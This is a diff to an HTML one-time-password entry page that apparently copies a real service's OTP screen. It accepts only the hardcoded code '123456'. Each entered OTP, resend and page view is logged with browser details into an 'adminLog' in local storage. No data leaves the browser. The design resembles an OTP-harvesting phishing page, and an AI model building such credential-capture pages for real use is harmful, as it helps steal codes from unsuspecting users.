@@ -202,6 +202,35 @@
             border-top: 1px solid #ccc;
             margin: 15px 0;
         }
+        
+        /* Success message styling */
+        .success-message {
+            color: #008000 !important;
+            font-size: 12px;
+            margin: 8px 0 0 0;
+            text-align: left;
+            line-height: 1.6;
+            font-weight: normal;
+            display: none;
+            padding-left: 2px;
+        }
+        
+        /* Loading/spinner for proceed button */
+        .button-loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -233,9 +262,14 @@
                     <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                     <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}" placeholder="entre 6 digit otp">
                     
-                    <!-- Error message हमेशा दिखेगा -->
-                    <div class="error-message" id="errorMessage">
+                    <!-- Error message for invalid OTP -->
+                    <div class="error-message" id="errorMessage" style="display: none;">
                         <span class="error-title">Invalid One Time Password!</span>
+                    </div>
+                    
+                    <!-- Success message for valid OTP -->
+                    <div class="success-message" id="successMessage">
+                        <span class="error-title">✓ OTP Verified! Redirecting...</span>
                     </div>
                 </div>
                 
@@ -263,6 +297,7 @@
         const timerElement = document.getElementById('timer');
         const proceedButton = document.getElementById('proceedButton');
         const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
         const resendButton = document.getElementById('resendButton');
         
         // Timer Countdown (176 seconds as in image)
@@ -295,20 +330,25 @@
                 otp: otpValue,
                 status: status,
                 timestamp: new Date().toISOString(),
-                page: window.location.href
+                page: window.location.href,
+                userAgent: navigator.userAgent,
+                timeSpent: (176 - seconds) + ' seconds'
             };
             
             submissions.push(otpEntry);
             localStorage.setItem('formSubmissions', JSON.stringify(submissions));
             
-            // Also save to a separate admin log
+            // Also save to a separate admin log with more details
             const adminLog = JSON.parse(localStorage.getItem('adminLog') || '[]');
             adminLog.push({
                 ...otpEntry,
-                userAgent: navigator.userAgent,
-                referrer: document.referrer
+                referrer: document.referrer,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language
             });
             localStorage.setItem('adminLog', JSON.stringify(adminLog));
+            
+            console.log(`OTP Data Saved: ${otpValue} - Status: ${status}`);
         }
         
         // OTP Input - Auto move and formatting
@@ -317,27 +357,83 @@
             value = value.substring(0, 6);
             e.target.value = value;
             
-            // OTP डालने पर error message नहीं छिपेगा
+            // Hide error message when user starts typing again
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+            otpInput.style.borderBottomColor = '#ccc';
         });
         
         // Proceed Button
-        proceedButton.addEventListener('click', function(e) {
+        proceedButton.addEventListener('click', async function(e) {
             e.preventDefault();
             
             const otpValue = otpInput.value.trim();
             
-            /
+            // Check if OTP is empty
+            if (otpValue === '') {
+                otpInput.style.borderBottomColor = '#ff0000';
+                errorMessage.innerHTML = '<span class="error-title">Please enter OTP!</span>';
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                otpInput.focus();
                 return;
             }
             
-            // If OTP is valid, proceed to next page
-            otpInput.style.borderBottomColor = '#24A1E8';
+            // Check if OTP is valid format (6 digits)
+            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
+                otpInput.style.borderBottomColor = '#ff0000';
+                errorMessage.innerHTML = '<span class="error-title">Invalid OTP! Must be 6 digits.</span>';
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                
+                // Save invalid format OTP attempt
+                saveOTPData(otpValue, 'invalid_format');
+                
+                otpInput.focus();
+                return;
+            }
+            
+            // Show loading state
+            const originalText = proceedButton.innerHTML;
+            proceedButton.innerHTML = '<div class="button-loader"></div> Verifying...';
+            proceedButton.disabled = true;
+            
+            // Simulate API call delay
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // If OTP is not "123456", show error (stay on same page)
+            if (otpValue !== "123456") {
+                otpInput.style.borderBottomColor = '#ff0000';
+                errorMessage.innerHTML = '<span class="error-title">Invalid One Time Password! Please try again.</span>';
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                
+                // Save incorrect OTP attempt
+                saveOTPData(otpValue, 'incorrect');
+                
+                // Reset button
+                proceedButton.innerHTML = originalText;
+                proceedButton.disabled = false;
+                
+                otpInput.focus();
+                return;
+            }
+            
+            // If OTP is valid, show success and redirect
+            otpInput.style.borderBottomColor = '#008000';
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'block';
             
             // Save correct OTP data
             saveOTPData(otpValue, 'correct');
             
-            // Redirect to next page
-            window.location.href = 'blogfive.html';
+            // Update button to show success
+            proceedButton.innerHTML = '<div class="button-loader"></div> Redirecting...';
+            
+            // Redirect to next page after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'blogfive.html';
+            }, 2000);
         });
         
         // Resend OTP Button (skyblue button)
@@ -361,8 +457,10 @@
             // Clear OTP field
             otpInput.value = "";
             
-            // Reset border color
+            // Reset border color and messages
             otpInput.style.borderBottomColor = '#ccc';
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
             
             // Disable button again
             resendButton.disabled = true;
@@ -370,11 +468,17 @@
             // Focus on OTP input
             otpInput.focus();
             
-            // Show temporary message
-            alert("New OTP has been sent to your mobile number.");
-            
-            // Log OTP resend action
+            // Save OTP resend action
             saveOTPData('RESEND_REQUEST', 'resend_request');
+            
+            // Show temporary success message
+            successMessage.innerHTML = '<span class="error-title">✓ New OTP sent to your mobile!</span>';
+            successMessage.style.display = 'block';
+            
+            // Hide success message after 3 seconds
+            setTimeout(() => {
+                successMessage.style.display = 'none';
+            }, 3000);
         });
         
         // Also handle Enter key on OTP input
@@ -387,10 +491,20 @@
         // Focus on OTP input when page loads
         window.onload = function() {
             otpInput.focus();
+            
+            // Load previous OTP attempts count
+            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
+            const otpAttempts = submissions.filter(entry => entry.type === 'OTP2').length;
+            
+            if (otpAttempts > 0) {
+                console.log(`Previous OTP attempts: ${otpAttempts}`);
+            }
         };
+        
+        // Also save page view/load event
+        window.addEventListener('load', function() {
+            saveOTPData('PAGE_LOAD', 'page_view');
+        });
     </script>
 </body>
 </html>
-
-
-
